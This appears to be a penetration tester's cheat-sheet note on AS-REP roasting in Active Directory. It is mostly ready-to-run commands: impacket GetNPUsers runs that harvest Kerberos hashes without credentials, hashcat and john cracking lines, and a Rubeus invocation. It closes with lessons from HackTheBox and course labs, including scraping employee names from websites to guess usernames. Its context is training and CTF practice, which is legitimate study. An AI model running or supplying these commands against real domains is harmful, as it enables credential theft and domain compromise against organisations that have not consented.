# AS-REP Roasting

Targets accounts with **"Do not require Kerberos preauthentication"** enabled.

**No credentials needed** - just valid usernames.

---

## From Linux

```bash
# With username list (no creds)
impacket-GetNPUsers domain.local/ -dc-ip $DC -usersfile users.txt -no-pass -outputfile asrep.txt
```

```bash
# Single user (no creds)
impacket-GetNPUsers domain.local/username -dc-ip $DC -no-pass
```

```bash
# Auto-find vulnerable users (needs creds)
impacket-GetNPUsers domain.local/user:REDACTED -dc-ip $DC -request
```

---

## Crack the Hash

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

```bash
john asrep.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## From Windows

```powershell
.\Rubeus.exe asreproast /outfile:REDACTED
```

---

## Next Steps

After cracking → validate creds → continue [[AD-Methodology]] Phase 2.

## From Your Boxes

> **Forest** (HTB) - AS-REP roasting with enumerated user list to get initial foothold
> - What worked: `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip TARGET_IP htb/${user} | grep -v Impacket; done`
> - Cracked hash for `svc-alfresco` which led to WinRM access and full domain compromise
> - Lesson: Loop GetNPUsers over all enumerated users when you have no creds at all

> **Sauna** (HTB) - AS-REP roasting after building username list from website "About" page
> - What worked: `impacket-getNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip TARGET`
> - Built username list from employee names on the bank website, cracked hash for `fsmith`
> - Lesson: Scrape employee names from websites and generate username permutations (first.last, f.last, flast)

> **Relia** (Course) - AS-REP roasting the DC after pivoting into internal network
> - What worked: `impacket-GetNPUsers -dc-ip INTERNAL_IP -request -outputfile hashes.asreproast relia.com/jim`
> - Gained Michelle's hash after pivoting, used it to move deeper into the domain
> - Lesson: AS-REP roast from inside the network after pivoting - not just from the outside
